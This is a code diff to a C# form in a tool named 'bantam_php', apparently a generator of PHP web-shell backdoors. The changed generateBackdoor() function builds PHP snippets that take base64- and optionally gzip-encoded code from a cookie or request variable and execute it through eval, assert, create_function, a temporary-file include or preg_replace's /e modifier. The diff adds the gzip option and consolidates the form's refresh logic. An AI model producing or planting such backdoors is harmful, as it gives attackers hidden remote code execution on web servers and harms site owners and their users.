@@ -32,6 +32,17 @@ namespace bantam_php
             richTextBoxBackdoor.Text = generateBackdoor();
         }
 
+        public void UpdateForm()
+        {
+            string backdoorCode = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, chckbxGzipDecodeRequest.Checked, (BackdoorTypes)comboBoxMethod.SelectedIndex);
+
+            if (chkbxMinifyCode.Checked) {
+                backdoorCode = Helper.MinifyCode(backdoorCode);
+            }
+
+            richTextBoxBackdoor.Text = backdoorCode;
+        }
+
         //filter_var($_REQUEST['test'], FILTER_CALLBACK, array("options" => strrev("tressa")));
 
         //@extract($_REQUEST); ...
@@ -41,24 +52,32 @@ namespace bantam_php
         /// </summary>
         /// <param name="varName"></param>
         /// <returns></returns>
-        public string generateBackdoor(string varName = "command", string varType = "COOKIE", BackdoorTypes backdoorType = BackdoorTypes.EVAL)
+        public string generateBackdoor(string varName = "command", string varType = "COOKIE", bool gzInflateRequest = false, BackdoorTypes backdoorType = BackdoorTypes.EVAL)
         {
-            string backdoorResult = "";
+            string backdoorResult = string.Empty;
+            string gzInflateStart = string.Empty;
+            string gzInflateEnd = string.Empty;
+
             varType = varType.ToUpper();
+
+            if (gzInflateRequest) {
+                gzInflateStart = "@gzinflate(";
+                gzInflateEnd = ")";
+            }
 
             switch (backdoorType) {
                 case BackdoorTypes.EVAL: {
-                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@eval(@base64_decode($_" + varType + "['" + varName + "']));\r\n}";
+                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@eval(" + gzInflateStart + "@base64_decode($_" + varType + "['" + varName + "'])"+ gzInflateEnd + ");\r\n}";
                         break;
                     }
 
                 case BackdoorTypes.ASSERT: {
-                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@assert(@base64_decode($_" + varType + "['" + varName + "']));\r\n}";
+                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@assert(" + gzInflateStart + "@base64_decode($_" + varType + "['" + varName + "'])" + gzInflateEnd + ");\r\n}";
                         break;
                     }
 
                 case BackdoorTypes.CREATE_FUNCTION: {
-                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t$a=@create_function(null, @base64_decode($_" + varType + "['" + varName + "']));\r\n\t$a();\r\n}";
+                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t$a=@create_function(null, " + gzInflateStart + "@base64_decode($_" + varType + "['" + varName + "'])" + gzInflateEnd + ");\r\n\t$a();\r\n}";
                         break;
                     }
 
@@ -68,12 +87,13 @@ namespace bantam_php
                     }
 
                 case BackdoorTypes.TMP_INCLUDE: {
-                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t$fp = @tmpfile();\r\n\t$tmpf=@stream_get_meta_data($fp);\r\n\t$tmpf=$tmpf['uri'];\r\n\t@fwrite($fp, '<?php '.@base64_decode($_" + varType + "['" + varName + "']));\r\n\t@include($tmpf);\r\n\t@fclose($f);\r\n}";
+                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t$fp = @tmpfile();\r\n\t$tmpf=@stream_get_meta_data($fp);\r\n\t$tmpf=$tmpf['uri'];\r\n\t@fwrite($fp, '<?php '." + gzInflateStart + "@base64_decode($_" + varType + "['" + varName + "'])" + gzInflateEnd + ");\r\n\t@include($tmpf);\r\n\t@fclose($f);\r\n}";
                         break;
                     }
 
                 case BackdoorTypes.PREG_REPLACE: {
-                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@base64_decode(@preg_replace(\"/.*/\x65\", $_" + varType + "['" + varName + "'],'.'));\r\n}";
+                        //todo this looks wrong af and doesnt support gzip
+                        backdoorResult = "<?php \r\nif(isset($_" + varType + "['" + varName + "'])) {\r\n\t@preg_replace(\"/.*/\x65\", " + gzInflateStart + "@base64_decode($_" + varType + "['" + varName + "']" + gzInflateEnd + "),'.');\r\n}";
                         break;
                     }
             }
@@ -91,12 +111,7 @@ namespace bantam_php
         /// <param name="e"></param>
         private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
         {
-            if (chkbxMinifyCode.Checked) {
-                string backdoorCode = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
-                richTextBoxBackdoor.Text = Helper.MinifyCode(backdoorCode);
-            } else {
-                richTextBoxBackdoor.Text = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
-            }
+            UpdateForm();
         }
 
         /// <summary>
@@ -106,12 +121,7 @@ namespace bantam_php
         /// <param name="e"></param>
         private void txtBoxVarName_TextChanged(object sender, EventArgs e)
         {
-            if (chkbxMinifyCode.Checked) {
-                string backdoorCode = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
-                richTextBoxBackdoor.Text = Helper.MinifyCode(backdoorCode);
-            } else {
-                richTextBoxBackdoor.Text = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
-            }
+            UpdateForm();
         }
 
         /// <summary>
@@ -121,7 +131,7 @@ namespace bantam_php
         /// <param name="e"></param>
         private void chkbxUseCookie_CheckStateChanged(object sender, EventArgs e)
         {
-
+            UpdateForm();
         }
 
         /// <summary>
@@ -131,27 +141,22 @@ namespace bantam_php
         /// <param name="e"></param>
         private void chkbxDisableLogging_CheckStateChanged(object sender, EventArgs e)
         {
+            UpdateForm();
+        }
 
+        private void chckbxGzipDecodeRequest_CheckedChanged(object sender, EventArgs e)
+        {
+            UpdateForm();
         }
 
         private void chkbxMinifyCode_CheckedChanged(object sender, EventArgs e)
         {
-            if (chkbxMinifyCode.Checked) {
-                string backdoorCode = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
-                richTextBoxBackdoor.Text = Helper.MinifyCode(backdoorCode);
-            } else {
-                richTextBoxBackdoor.Text = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
-            }
+            UpdateForm();
         }
 
         private void comboBoxVarType_SelectedIndexChanged(object sender, EventArgs e)
         {
-            if (chkbxMinifyCode.Checked) {
-                string backdoorCode = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
-                richTextBoxBackdoor.Text = Helper.MinifyCode(backdoorCode);
-            } else {
-                richTextBoxBackdoor.Text = generateBackdoor(txtBoxVarName.Text, comboBoxVarType.Text, (BackdoorTypes)comboBoxMethod.SelectedIndex);
-            }
+            UpdateForm();
         }
 
         private void saveAsToolStripMenuItem1_Click(object sender, EventArgs e)
